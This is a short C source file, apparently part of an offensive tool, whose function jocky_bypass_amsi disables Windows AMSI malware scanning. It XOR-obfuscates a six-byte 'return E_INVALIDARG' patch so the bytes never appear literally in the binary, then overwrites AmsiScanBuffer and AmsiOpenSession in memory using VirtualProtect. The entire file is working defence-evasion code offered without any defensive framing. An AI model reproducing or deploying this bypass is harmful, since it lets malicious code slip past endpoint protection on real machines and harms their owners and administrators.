#include "amsi_bypass.h"
#include <windows.h>
#include <string.h>

static void xor_decode(unsigned char *buf, int len, unsigned char key) {
    for (int i = 0; i < len; i++) buf[i] ^= key;
}

bool jocky_bypass_amsi(void) {
    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
    if (!hAmsi) {
        hAmsi = LoadLibraryA("amsi.dll");
        if (!hAmsi)
            return true;  /* amsi.dll absent — nothing to bypass */
    }

    /* Patch bytes encoded XOR 0x55: mov eax,0x80070057 ; ret
     * Plaintext: B8 57 00 07 80 C3 — never appears literally in binary. */
    unsigned char patch[] = {0xED, 0x02, 0x55, 0x52, 0xD5, 0x96};
    xor_decode(patch, sizeof(patch), 0x55);

    FARPROC pScan = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pScan)
        return false;

    DWORD old_protect;
    if (!VirtualProtect((LPVOID)pScan, 6, PAGE_EXECUTE_READWRITE, &old_protect))
        return false;

    memcpy((void*)pScan, patch, sizeof(patch));
    VirtualProtect((LPVOID)pScan, 6, old_protect, &old_protect);

    FARPROC pOpen = GetProcAddress(hAmsi, "AmsiOpenSession");
    if (pOpen) {
        DWORD op2;
        if (VirtualProtect((LPVOID)pOpen, 6, PAGE_EXECUTE_READWRITE, &op2)) {
            memcpy((void*)pOpen, patch, sizeof(patch));
            VirtualProtect((LPVOID)pOpen, 6, op2, &op2);
        }
    }

    return true;
}
